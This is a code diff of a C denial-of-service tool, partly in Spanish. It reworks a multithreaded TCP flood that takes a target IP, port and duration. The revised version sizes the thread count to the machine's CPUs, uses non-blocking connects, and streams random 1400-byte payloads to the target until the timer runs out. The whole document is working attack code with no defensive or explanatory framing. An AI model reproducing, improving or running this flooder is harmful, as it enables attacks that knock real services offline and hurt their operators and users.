@@ -2,77 +2,127 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 #include <time.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <linux/tcp.h>
+#include <sys/socket.h>
+#include <stdint.h>
+#include <sys/select.h>
 #include <pthread.h>
-#include <netinet/tcp.h>
+#include <errno.h>
+#include <fcntl.h>
 
-#define MAX_THREADS 200
-#define BUFFER_SIZE 1460
+#define SIZE 1400
 
-void *tcp_flood(void *arg) {
-    char **args = (char **)arg;
-    char *ip = args[0];
-    int port = atoi(args[1]);
-    int duration = atoi(args[2]);
-    
-    time_t start = time(NULL);
-    unsigned long connections = 0;
-    
-    while(time(NULL) - start < duration) {
-        int sock = socket(AF_INET, SOCK_STREAM, 0);
-        if(sock < 0) continue;
-        
-        // Configurar socket para no bloquear
-        int flags = 1;
-        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &flags, sizeof(flags));
-        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flags, sizeof(flags));
-        
-        struct sockaddr_in server_addr;
-        memset(&server_addr, 0, sizeof(server_addr));
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(port);
-        inet_pton(AF_INET, ip, &server_addr.sin_addr);
-        
-        // Conectar (no esperar)
-        connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
-        
-        // Enviar datos aleatorios
-        char buffer[BUFFER_SIZE];
-        for(int i = 0; i < 100; i++) { // Enviar 100 paquetes por conexión
-            send(sock, buffer, BUFFER_SIZE, 0);
-        }
-        
-        close(sock);
-        connections++;
-        
-        if(connections % 1000 == 0) {
-            printf("[TCP] Thread: %lu connections to %s:%d\n", connections, ip, port);
+struct argsattack {
+    char *ip;
+    int port;
+    int duracion;
+    time_t start;
+};
+
+static int countcpu(void) {
+    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
+    if (cpus <= 0) return 4;  // fallback
+    return (int)(cpus * 2);
+}
+
+static void *tcp_flood(void *arg) {
+    struct argsattack *args = (struct argsattack *)arg;
+    time_t end = args->start + args->duracion;
+
+    struct sockaddr_in dst = {0};
+    dst.sin_family = AF_INET;
+    dst.sin_port = htons(args->port);
+    dst.sin_addr.s_addr = inet_addr(args->ip);
+
+    unsigned int seed = (unsigned int)(time(NULL) ^ (uintptr_t)pthread_self());
+
+    while (time(NULL) < end) {
+        for (int attempt = 0; attempt < 100; attempt++) {
+            if (time(NULL) >= end) break;
+
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if(sock < 0) continue;
+
+            fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK);
+
+            int flag = 1;
+            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
+#ifdef TCP_QUICKACK
+            setsockopt(sock, IPPROTO_TCP, TCP_QUICKACK, &flag, sizeof(flag));
+#endif
+            connect(sock, (struct sockaddr *)&dst, sizeof(dst));
+
+            fd_set fdw;
+            FD_ZERO(&fdw);
+            FD_SET(sock, &fdw);
+            struct timeval tv = {0, 0};
+
+            if (select(sock + 1, NULL, &fdw, NULL, &tv) <= 0) {
+                close(sock);
+                continue;
+            }
+
+            int err = 0;
+            socklen_t len = sizeof(err);
+            if (getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
+                close(sock);
+                continue;
+            }
+
+            char payload[SIZE];
+            for(int i = 0; i < SIZE; i++){
+                payload[i] = (char)(rand_r(&seed) & 0xFF);
+            }
+            while (time(NULL) < end) {
+                ssize_t sent = send(sock, payload, SIZE, MSG_NOSIGNAL);
+                if (sent <= 0){
+                    break;
+                }
+            }
+
+            close(sock);
         }
     }
-    
+
     return NULL;
 }
 
 int main(int argc, char *argv[]) {
-    if(argc < 4) {
-        printf("TCP Flood - High GBPS Raw Sockets\n");
-        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
+    if (argc != 4) {
+        fprintf(stderr, "Uso: %s <ip> <port> <time>\n", argv[0]);
         return 1;
     }
-    
-    printf("[TCP] Starting TCP Flood on %s:%d for %s seconds\n", argv[1], atoi(argv[2]), argv[3]);
-    
-    pthread_t threads[MAX_THREADS];
-    
-    for(int i = 0; i < MAX_THREADS; i++) {
-        pthread_create(&threads[i], NULL, tcp_flood, argv + 1);
+
+    struct argsattack args = {
+        .ip       = argv[1],
+        .port     = atoi(argv[2]),
+        .duracion = atoi(argv[3]),
+        .start    = time(NULL)
+    };
+
+    int num_threads = countcpu();
+    pthread_t *threads = calloc(num_threads, sizeof(pthread_t));
+    if (!threads) {
+        perror("calloc");
+        return 1;
     }
-    
-    sleep(atoi(argv[3]));
-    
-    printf("[TCP] Attack completed\n");
+
+    printf("[ TCP FLOOD ] send: %s:%d  |  time: %d s  |  threads: %d\n",
+           args.ip, args.port, args.duracion, num_threads);
+    fflush(stdout);
+
+    for (int i = 0; i < num_threads; i++) {
+        pthread_create(&threads[i], NULL, tcp_flood, &args);
+    }
+
+    for (int i = 0; i < num_threads; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    printf("\n[ TCP FLOOD ] Finalizado\n");
+    free(threads);
     return 0;
 }
